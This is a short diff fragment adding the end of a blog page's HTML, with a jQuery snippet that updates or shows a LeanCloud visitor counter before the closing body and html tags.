+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
